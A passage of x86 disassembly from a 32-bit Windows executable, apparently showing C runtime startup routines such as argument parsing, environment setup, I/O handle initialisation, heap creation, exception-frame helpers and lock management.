  424e0e:	dec    edx
  424e0f:	jne    0x424e04
  424e11:	mov    cl,BYTE PTR [eax]
  424e13:	test   cl,cl
  424e15:	je     0x424e5f
  424e17:	cmp    DWORD PTR [ebp-0x4],0x0
  424e1b:	jne    0x424e27
  424e1d:	cmp    cl,0x20
  424e20:	je     0x424e5f
  424e22:	cmp    cl,0x9
  424e25:	je     0x424e5f
  424e27:	test   ebx,ebx
  424e29:	je     0x424e59
  424e2b:	test   edi,edi
  424e2d:	je     0x424e48
  424e2f:	movzx  edx,cl
  424e32:	test   BYTE PTR [edx+0x463a21],0x4
  424e39:	je     0x424e41
  424e3b:	mov    BYTE PTR [edi],cl
  424e3d:	inc    edi
  424e3e:	inc    eax
  424e3f:	inc    DWORD PTR [esi]
  424e41:	mov    cl,BYTE PTR [eax]
  424e43:	mov    BYTE PTR [edi],cl
  424e45:	inc    edi
  424e46:	jmp    0x424e57
  424e48:	movzx  ecx,cl
  424e4b:	test   BYTE PTR [ecx+0x463a21],0x4
  424e52:	je     0x424e57
  424e54:	inc    eax
  424e55:	inc    DWORD PTR [esi]
  424e57:	inc    DWORD PTR [esi]
  424e59:	inc    eax
  424e5a:	jmp    0x424dc7
  424e5f:	test   edi,edi
  424e61:	je     0x424e67
  424e63:	and    BYTE PTR [edi],0x0
  424e66:	inc    edi
  424e67:	inc    DWORD PTR [esi]
  424e69:	mov    ebx,DWORD PTR [ebp+0xc]
  424e6c:	jmp    0x424d92
  424e71:	mov    eax,DWORD PTR [ebp+0x8]
  424e74:	test   eax,eax
  424e76:	je     0x424e7b
  424e78:	and    DWORD PTR [eax],0x0
  424e7b:	inc    DWORD PTR [ebx]
  424e7d:	pop    edi
  424e7e:	pop    ebx
  424e7f:	leave  
  424e80:	ret    
  424e81:	push   ebp
  424e82:	mov    ebp,esp
  424e84:	push   ecx
  424e85:	push   ecx
  424e86:	push   ebx
  424e87:	push   esi
  424e88:	push   edi
  424e89:	xor    edi,edi
  424e8b:	cmp    DWORD PTR ds:0x463d6c,edi
  424e91:	jne    0x424e98
  424e93:	call   0x42601c
  424e98:	and    BYTE PTR ds:0x463714,0x0
  424e9f:	push   0x104
  424ea4:	mov    esi,0x463610
  424ea9:	push   esi
  424eaa:	push   edi
  424eab:	call   DWORD PTR ds:0x4290a8
  424eb1:	mov    eax,ds:0x463d74
  424eb6:	cmp    eax,edi
  424eb8:	mov    DWORD PTR ds:0x4635f4,esi
  424ebe:	je     0x424ec7
  424ec0:	cmp    BYTE PTR [eax],0x0
  424ec3:	mov    ebx,eax
  424ec5:	jne    0x424ec9
  424ec7:	mov    ebx,esi
  424ec9:	lea    eax,[ebp-0x4]
  424ecc:	push   eax
  424ecd:	push   edi
  424ece:	lea    esi,[ebp-0x8]
  424ed1:	xor    ecx,ecx
  424ed3:	mov    eax,ebx
  424ed5:	call   0x424d15
  424eda:	mov    esi,DWORD PTR [ebp-0x4]
  424edd:	mov    eax,DWORD PTR [ebp-0x8]
  424ee0:	shl    esi,0x2
  424ee3:	add    eax,esi
  424ee5:	push   eax
  424ee6:	call   0x426152
  424eeb:	mov    edi,eax
  424eed:	add    esp,0xc
  424ef0:	test   edi,edi
  424ef2:	jne    0x424ef9
  424ef4:	or     eax,0xffffffff
  424ef7:	jmp    0x424f1e
  424ef9:	lea    eax,[ebp-0x4]
  424efc:	push   eax
  424efd:	lea    ecx,[esi+edi*1]
  424f00:	push   edi
  424f01:	lea    esi,[ebp-0x8]
  424f04:	mov    eax,ebx
  424f06:	call   0x424d15
  424f0b:	mov    eax,DWORD PTR [ebp-0x4]
  424f0e:	dec    eax
  424f0f:	pop    ecx
  424f10:	mov    ds:0x4635d8,eax
  424f15:	pop    ecx
  424f16:	mov    DWORD PTR ds:0x4635dc,edi
  424f1c:	xor    eax,eax
  424f1e:	pop    edi
  424f1f:	pop    esi
  424f20:	pop    ebx
  424f21:	leave  
  424f22:	ret    
  424f23:	push   ecx
  424f24:	push   ecx
  424f25:	mov    eax,ds:0x463718
  424f2a:	push   ebx
  424f2b:	push   ebp
  424f2c:	push   esi
  424f2d:	push   edi
  424f2e:	mov    edi,DWORD PTR ds:0x4290c0
  424f34:	xor    ebx,ebx
  424f36:	xor    esi,esi
  424f38:	cmp    eax,ebx
  424f3a:	push   0x2
  424f3c:	pop    ebp
  424f3d:	jne    0x424f6c
  424f3f:	call   edi
  424f41:	mov    esi,eax
  424f43:	cmp    esi,ebx
  424f45:	je     0x424f53
  424f47:	mov    DWORD PTR ds:0x463718,0x1
  424f51:	jmp    0x424f71
  424f53:	call   DWORD PTR ds:0x429030
  424f59:	cmp    eax,0x78
  424f5c:	jne    0x424f67
  424f5e:	mov    eax,ebp
  424f60:	mov    ds:0x463718,eax
  424f65:	jmp    0x424f6c
  424f67:	mov    eax,ds:0x463718
  424f6c:	cmp    eax,0x1
  424f6f:	jne    0x424fee
  424f71:	cmp    esi,ebx
  424f73:	jne    0x424f7d
  424f75:	call   edi
  424f77:	mov    esi,eax
  424f79:	cmp    esi,ebx
  424f7b:	je     0x424ff6
  424f7d:	cmp    WORD PTR [esi],bx
  424f80:	mov    eax,esi
  424f82:	je     0x424f92
  424f84:	add    eax,ebp
  424f86:	cmp    WORD PTR [eax],bx
  424f89:	jne    0x424f84
  424f8b:	add    eax,ebp
  424f8d:	cmp    WORD PTR [eax],bx
  424f90:	jne    0x424f84
  424f92:	mov    edi,DWORD PTR ds:0x4290bc
  424f98:	push   ebx
  424f99:	push   ebx
  424f9a:	push   ebx
  424f9b:	sub    eax,esi
  424f9d:	push   ebx
  424f9e:	sar    eax,1
  424fa0:	inc    eax
  424fa1:	push   eax
  424fa2:	push   esi
  424fa3:	push   ebx
  424fa4:	push   ebx
  424fa5:	mov    DWORD PTR [esp+0x34],eax
  424fa9:	call   edi
  424fab:	mov    ebp,eax
  424fad:	cmp    ebp,ebx
  424faf:	je     0x424fe3
  424fb1:	push   ebp
  424fb2:	call   0x426152
  424fb7:	cmp    eax,ebx
  424fb9:	pop    ecx
  424fba:	mov    DWORD PTR [esp+0x10],eax
  424fbe:	je     0x424fe3
  424fc0:	push   ebx
  424fc1:	push   ebx
  424fc2:	push   ebp
  424fc3:	push   eax
  424fc4:	push   DWORD PTR [esp+0x24]
  424fc8:	push   esi
  424fc9:	push   ebx
  424fca:	push   ebx
  424fcb:	call   edi
  424fcd:	test   eax,eax
  424fcf:	jne    0x424fdf
  424fd1:	push   DWORD PTR [esp+0x10]
  424fd5:	call   0x42603a
  424fda:	pop    ecx
  424fdb:	mov    DWORD PTR [esp+0x10],ebx
  424fdf:	mov    ebx,DWORD PTR [esp+0x10]
  424fe3:	push   esi
  424fe4:	call   DWORD PTR ds:0x4290b8
  424fea:	mov    eax,ebx
  424fec:	jmp    0x42503e
  424fee:	cmp    eax,ebp
  424ff0:	je     0x424ffa
  424ff2:	cmp    eax,ebx
  424ff4:	je     0x424ffa
  424ff6:	xor    eax,eax
  424ff8:	jmp    0x42503e
  424ffa:	call   DWORD PTR ds:0x4290b4
  425000:	mov    esi,eax
  425002:	cmp    esi,ebx
  425004:	je     0x424ff6
  425006:	cmp    BYTE PTR [esi],bl
  425008:	je     0x425014
  42500a:	inc    eax
  42500b:	cmp    BYTE PTR [eax],bl
  42500d:	jne    0x42500a
  42500f:	inc    eax
  425010:	cmp    BYTE PTR [eax],bl
  425012:	jne    0x42500a
  425014:	sub    eax,esi
  425016:	inc    eax
  425017:	mov    ebp,eax
  425019:	push   ebp
  42501a:	call   0x426152
  42501f:	mov    edi,eax
  425021:	cmp    edi,ebx
  425023:	pop    ecx
  425024:	jne    0x42502a
  425026:	xor    edi,edi
  425028:	jmp    0x425035
  42502a:	push   ebp
  42502b:	push   esi
  42502c:	push   edi
  42502d:	call   0x426170
  425032:	add    esp,0xc
  425035:	push   esi
  425036:	call   DWORD PTR ds:0x4290b0
  42503c:	mov    eax,edi
  42503e:	pop    edi
  42503f:	pop    esi
  425040:	pop    ebp
  425041:	pop    ebx
  425042:	pop    ecx
  425043:	pop    ecx
  425044:	ret    
  425045:	sub    esp,0x48
  425048:	push   ebx
  425049:	mov    ebx,0x480
  42504e:	push   ebx
  42504f:	call   0x426152
  425054:	test   eax,eax
  425056:	pop    ecx
  425057:	jne    0x425061
  425059:	or     eax,0xffffffff
  42505c:	jmp    0x42523e
  425061:	mov    ds:0x463c60,eax
  425066:	mov    DWORD PTR ds:0x463c48,0x20
  425070:	lea    ecx,[eax+0x480]
  425076:	jmp    0x425096
  425078:	and    BYTE PTR [eax+0x4],0x0
  42507c:	or     DWORD PTR [eax],0xffffffff
  42507f:	and    DWORD PTR [eax+0x8],0x0
  425083:	mov    BYTE PTR [eax+0x5],0xa
  425087:	mov    ecx,DWORD PTR ds:0x463c60
  42508d:	add    eax,0x24
  425090:	add    ecx,0x480
  425096:	cmp    eax,ecx
  425098:	jb     0x425078
  42509a:	push   ebp
  42509b:	push   esi
  42509c:	push   edi
  42509d:	lea    eax,[esp+0x14]
  4250a1:	push   eax
  4250a2:	call   DWORD PTR ds:0x429090
  4250a8:	cmp    WORD PTR [esp+0x46],0x0
  4250ae:	je     0x42519d
  4250b4:	mov    eax,DWORD PTR [esp+0x48]
  4250b8:	test   eax,eax
  4250ba:	je     0x42519d
  4250c0:	mov    edi,DWORD PTR [eax]
  4250c2:	lea    ebp,[eax+0x4]
  4250c5:	lea    eax,[edi+ebp*1]
  4250c8:	mov    DWORD PTR [esp+0x10],eax
  4250cc:	mov    eax,0x800
  4250d1:	cmp    edi,eax
  4250d3:	jl     0x4250d7
  4250d5:	mov    edi,eax
  4250d7:	cmp    DWORD PTR ds:0x463c48,edi
  4250dd:	jge    0x42512d
  4250df:	mov    esi,0x463c64
  4250e4:	push   ebx
  4250e5:	call   0x426152
  4250ea:	test   eax,eax
  4250ec:	pop    ecx
  4250ed:	je     0x425127
  4250ef:	add    DWORD PTR ds:0x463c48,0x20
  4250f6:	mov    DWORD PTR [esi],eax
  4250f8:	lea    ecx,[eax+0x480]
  4250fe:	jmp    0x425116
  425100:	and    BYTE PTR [eax+0x4],0x0
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	and    DWORD PTR [eax+0x8],0x0
  42510b:	mov    BYTE PTR [eax+0x5],0xa
  42510f:	mov    ecx,DWORD PTR [esi]
  425111:	add    eax,0x24
  425114:	add    ecx,ebx
  425116:	cmp    eax,ecx
  425118:	jb     0x425100
  42511a:	add    esi,0x4
  42511d:	cmp    DWORD PTR ds:0x463c48,edi
  425123:	jl     0x4250e4
  425125:	jmp    0x42512d
  425127:	mov    edi,DWORD PTR ds:0x463c48
  42512d:	xor    ebx,ebx
  42512f:	test   edi,edi
  425131:	jle    0x42519d
  425133:	mov    eax,DWORD PTR [esp+0x10]
  425137:	mov    eax,DWORD PTR [eax]
  425139:	cmp    eax,0xffffffff
  42513c:	je     0x425192
  42513e:	mov    cl,BYTE PTR [ebp+0x0]
  425141:	test   cl,0x1
  425144:	je     0x425192
  425146:	test   cl,0x8
  425149:	jne    0x425156
  42514b:	push   eax
  42514c:	call   DWORD PTR ds:0x4290c8
  425152:	test   eax,eax
  425154:	je     0x425192
  425156:	mov    ecx,ebx
  425158:	mov    eax,ebx
  42515a:	and    eax,0x1f
  42515d:	lea    eax,[eax+eax*8]
  425160:	sar    ecx,0x5
  425163:	mov    ecx,DWORD PTR [ecx*4+0x463c60]
  42516a:	lea    esi,[ecx+eax*4]
  42516d:	mov    eax,DWORD PTR [esp+0x10]
  425171:	mov    eax,DWORD PTR [eax]
  425173:	mov    DWORD PTR [esi],eax
  425175:	mov    al,BYTE PTR [ebp+0x0]
  425178:	mov    BYTE PTR [esi+0x4],al
  42517b:	lea    eax,[esi+0xc]
  42517e:	push   0xfa0
  425183:	push   eax
  425184:	call   0x4264bd
  425189:	test   eax,eax
  42518b:	pop    ecx
  42518c:	pop    ecx
  42518d:	je     0x4251bd
  42518f:	inc    DWORD PTR [esi+0x8]
  425192:	add    DWORD PTR [esp+0x10],0x4
  425197:	inc    ebx
  425198:	inc    ebp
  425199:	cmp    ebx,edi
  42519b:	jl     0x425133
  42519d:	xor    ebx,ebx
  42519f:	mov    ecx,DWORD PTR ds:0x463c60
  4251a5:	lea    eax,[ebx+ebx*8]
  4251a8:	lea    esi,[ecx+eax*4]
  4251ab:	cmp    DWORD PTR [esi],0xffffffff
  4251ae:	jne    0x42521f
  4251b0:	test   ebx,ebx
  4251b2:	mov    BYTE PTR [esi+0x4],0x81
  4251b6:	jne    0x4251c2
  4251b8:	push   0xfffffff6
  4251ba:	pop    eax
  4251bb:	jmp    0x4251cc
  4251bd:	or     eax,0xffffffff
  4251c0:	jmp    0x42523b
  4251c2:	mov    eax,ebx
  4251c4:	dec    eax
  4251c5:	neg    eax
  4251c7:	sbb    eax,eax
  4251c9:	add    eax,0xfffffff5
  4251cc:	push   eax
  4251cd:	call   DWORD PTR ds:0x4290a4
  4251d3:	mov    edi,eax
  4251d5:	cmp    edi,0xffffffff
  4251d8:	je     0x425219
  4251da:	push   edi
  4251db:	call   DWORD PTR ds:0x4290c8
  4251e1:	test   eax,eax
  4251e3:	je     0x425219
  4251e5:	and    eax,0xff
  4251ea:	cmp    eax,0x2
  4251ed:	mov    DWORD PTR [esi],edi
  4251ef:	jne    0x4251f7
  4251f1:	or     BYTE PTR [esi+0x4],0x40
  4251f5:	jmp    0x425200
  4251f7:	cmp    eax,0x3
  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
  425772:	jne    0x425792
  425774:	push   0x42963c
